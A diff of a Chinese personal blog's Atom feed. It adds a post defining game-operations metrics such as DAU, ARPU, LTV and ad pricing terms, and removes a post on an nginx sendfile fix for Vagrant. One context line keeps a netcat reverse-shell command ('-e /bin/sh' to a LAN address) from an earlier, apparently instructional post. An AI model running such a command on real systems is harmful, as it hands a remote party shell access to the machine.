@@ -4,13 +4,152 @@
   <title><![CDATA[shengsheng的博客]]></title>
   <link href="http://www.shengsheng.net/atom.xml" rel="self"/>
   <link href="http://www.shengsheng.net/"/>
-  <updated>2020-02-06T18:52:45+08:00</updated>
+  <updated>2020-02-08T14:08:33+08:00</updated>
   <id>http://www.shengsheng.net/</id>
   <author>
     <name><![CDATA[]]></name>
     
   </author>
   <generator uri="http://www.mweb.im/">MWeb</generator>
+  
+  <entry>
+    <title type="html"><![CDATA[游戏运营相关参数]]></title>
+    <link href="http://www.shengsheng.net/15811419649126.html"/>
+    <updated>2020-02-08T14:06:04+08:00</updated>
+    <id>http://www.shengsheng.net/15811419649126.html</id>
+    <content type="html"><![CDATA[
+<h1 id="toc_0">计算公式</h1>
+
+<ul>
+<li>新增注册数：规定区服条件下的新增注册玩家数</li>
+<li>老用户：规定区服条件下的非当日新增注册的登陆玩家数</li>
+<li>DAU：新增注册数+老用户 （日活跃用户）</li>
+<li>新用户付费金额：新增注册玩家的总付费金额 （新总）</li>
+<li>总付费金额：新增注册玩家+老用户产生的总充值金额 （新+老）</li>
+<li>新用户付费人数：新增注册玩家中充值玩家总数 （新付人数）</li>
+<li>新增付费率：新用户付费数/新增注册数 （新付数/新)</li>
+<li>总付费人数：新增注册玩家+老用户产生的总充值人数 (新付+老付)</li>
+<li>注册ARPPU：新用户付费金额/新用户付费人数 （新付/新付数）</li>
+<li>活跃ARPPU：总付费金额/总付费人数  （总付/总付人）</li>
+<li>活跃付费率：总付费人数/DAU  (总付数/活跃人数)</li>
+<li>活跃ARPU：活跃ARPPU<em>活跃付费率 (arppu</em>付费率，也可以= 总付金额/dau)</li>
+<li>至今（LTV和充值类型数据 可加入）</li>
+<li>活跃ARPU：活跃ARPPU*活跃付费率 （同上，很好理解，反过来的逻辑）</li>
+<li>新增付费率 = （新增付费人数 / 新增注册数) </li>
+<li>活跃付费率 = 付费用户数 / 总用户数</li>
+<li>注册ARPU = 新增人数付费金额 / 新增注册数</li>
+<li>注册ARPPU = 新增人数付费金额 / 新增付费人数</li>
+<li>活跃ARPU = 付费金额 / 总用户数</li>
+<li>活跃ARPPU = 付费金额 / 付费人数</li>
+<li>活跃付费率 = 付费用户 / 总用户数</li>
+<li>注册成本 = 成本 / 新增注册数 </li>
+<li>激活注册率 = 注册 / 激活数  （这个要创角上传的情况下）</li>
+<li>激活成本 = 成本 / 激活数     （激活看是否注册还是创角）</li>
+<li>创角率 = 创角数 / 新增注册数<br/></li>
+</ul>
+
+<hr/>
+
+<ol>
+<li>DNU（Daily New Users）： 每日游戏中的新登入用户数量</li>
+<li>AU（Active Users）：活跃用户，统计周期内，登录过游戏的用户数</li>
+<li>相应的，根据统计周期，有DAU(日活跃用户)，WAU(周活跃用户),MAU(月活跃用户)等。</li>
+<li>PU ( Paying User）：付费用户</li>
+<li>APA（Active Payment Account）：活跃付费用户数</li>
+<li>这里我们要注意“用户”和“付费用户”的区分，这也将影响收入的计算。</li>
+<li>ARPU(<strong>Average Revenue Per User</strong>) ：平均每用户收入，即可通过 总收入/AU 计算得出。</li>
+<li>(平均收入每个用户)</li>
+<li>ARPPU (<strong>Average Revenue Per Paying User</strong>)： 平均每付费用户收入，可通过 总收入/APA 计算得出。</li>
+<li>（平均收入每个付费用户)</li>
+<li>PUR(Pay User Rate)：付费比率，可通过 APA/AU 计算得出。</li>
+<li>LTV(Lift Time Value)：生命周期价值，即平均一个用户在首次登录游戏到最后一次登录游戏内，为该游戏创造的收入总计</li>
+<li>投资回报率（ROI）=产出（销售收入）/ 投入（成本</li>
+</ol>
+
+<hr/>
+
+<p>至今LTV = 累积金额 / 总人数<br/>
+苹果至今=苹果内购累积金额/注册数<br/>
+苹果付费金额</p>
+
+<hr/>
+
+<h1 id="toc_1">选项</h1>
+
+<h2 id="toc_2">查询维度</h2>
+
+<ul>
+<li>按日期+系统</li>
+<li>按日期</li>
+<li>按游戏</li>
+<li>接日期+游戏</li>
+<li>落地页</li>
+<li>日期+落地页</li>
+<li>渠道</li>
+<li>日期+渠道</li>
+<li>日期+渠道+落地页<br/>
+## 系统</li>
+<li>全部</li>
+<li>IOS</li>
+<li>Android</li>
+</ul>
+
+<h2 id="toc_3">类型</h2>
+
+<ul>
+<li>LTV</li>
+<li>LTV比值</li>
+<li>LTV+LTV比值</li>
+<li>充值</li>
+<li>留存数</li>
+<li>留存率</li>
+<li>充值留存数</li>
+<li>充值留存率</li>
+<li>回本</li>
+<li>回本率</li>
+<li>注册</li>
+</ul>
+
+<h2 id="toc_4">范围</h2>
+
+<ul>
+<li>1~180天</li>
+<li>1~24小时</li>
+</ul>
+
+<h2 id="toc_5">排序</h2>
+
+<p>这个用得十分少，可以去掉</p>
+
+<h2 id="toc_6">权限</h2>
+
+<ul>
+<li>游戏负责管理 </li>
+<li>渠道负责</li>
+<li>游戏项目负责</li>
+</ul>
+
+<h2 id="toc_7">运营相关</h2>
+
+<ul>
+<li>修改玩家的手机号码</li>
+</ul>
+
+<h2 id="toc_8">其它</h2>
+
+<p>CPA：<br/>
+Cost Per Action 每效果成本——即按照效果付费。<br/>
+CPC：<br/>
+Cost Per Click;Cost Per Thousand Click-Through 每点击成本。<br/>
+CPT：<br/>
+Cost Per Time，CPT 是一种以时间来计费的广告。<br/>
+CPS：<br/>
+英文全称 Cost Per Sales。CPS 是一种以实际销售产品数量来计算广告费用的广告。<br/>
+CPPA：<br/>
+按照到达用户付费。既不是按照浏览量（PV）付费，也不是按照实际效果付费，而是按照到达的用户那个付费，在网站上等同于 UV，在手机端是新增用户上游数据（例如用户已下载安装还未打开激活 APP 的数量即为到达用户）</p>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[gradle读书笔记]]></title>
@@ -574,39 +713,6 @@ class b exntends a{public static $a=&#39;2&#39;}</p>
 ./netcat -vv -l -p 1222<br/>
 客户端<br/>
 ./netcat -e /bin/sh 192.168.1.101 1222</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[docker vagrant页面错误解决]]></title>
-    <link href="http://www.shengsheng.net/15809578635146.html"/>
-    <updated>2020-02-06T10:57:43+08:00</updated>
-    <id>http://www.shengsheng.net/15809578635146.html</id>
-    <content type="html"><![CDATA[
-<p>date: 2015-08-17 21:27</p>
-
-<p>之前提到说通过Vagrant部署开发环境，使用目录共享模式，在本地磁盘进行开发，而通过虚拟机环境运行开发的页面。</p>
-
-<p>是的，一切看起来都是那么的顺利，首先基于VirtualBox安装了Vagrant，接下来，按照以往部署环境的习惯，在VM中安装了nginx作为开发运行环境，并且将本地的共享目录作为nginx的web目录，然后打开页面，看上去似乎都很正常，但接下来，你发现了一个神奇的事情，你修改替换了一个css，一张图片，然后刷新浏览器，发现什么都没有变，然后你有非常猛烈、使劲的F5，依旧还是没有改变，是的，你看看编辑器，似乎替换是正常的，在看看VM上的文件，也都是对的，是的，尝试重启nginx，依旧没有任何变化，你开始怀疑php5-fpm甚至于毫不相干的memcached和mysql，但都无济于事。也不知道是什么让这些文件被“缓存”了呢。</p>
-
-<p>当你尝试修改一个js，并且用同样的方法更新之后，会遇到类似的问题，是的，就算重启VM上任何服务，甚至重启VM，依旧没有用，当然，比起其他资源文件，浏览器的反应会强烈一些，因为浏览器会提示未知错误，而你通过浏览器查看你修改的JS文件，会看到文件尾巴有下面奇怪的随机字符：</p>
-
-<p>�����������������</p>
-
-<p>这到底是什么东西呢？编码错误？缓存异常？又或是其他什么？</p>
-
-<p>是的，你尝试花费很多时间，试验各种各样的方法去解决这个问题，其实对于nginx来说，你只需要修改配置文件(nginx.conf)中的一行重启就能简单的解决这个问题：</p>
-
-<p>sendfile off;<br/>
-找到 nginx.conf ，把里面的 “sendfile on” 修改为 “sendfile off”。</p>
-
-<p>当然，如果你使用Apache也可能遇到类似的问题，那么同样也有类似的配置需要修改：</p>
-
-<p>EnableSendfile off</p>
-
-<p>＝＝＝＝＝<br/>
-<a href="http://stackoverflow.com/questions/9479117/vagrant-virtualbox-apache2-strange-cache-behaviour">http://stackoverflow.com/questions/9479117/vagrant-virtualbox-apache2-strange-cache-behaviour</a></p>
 
 ]]></content>
   </entry>
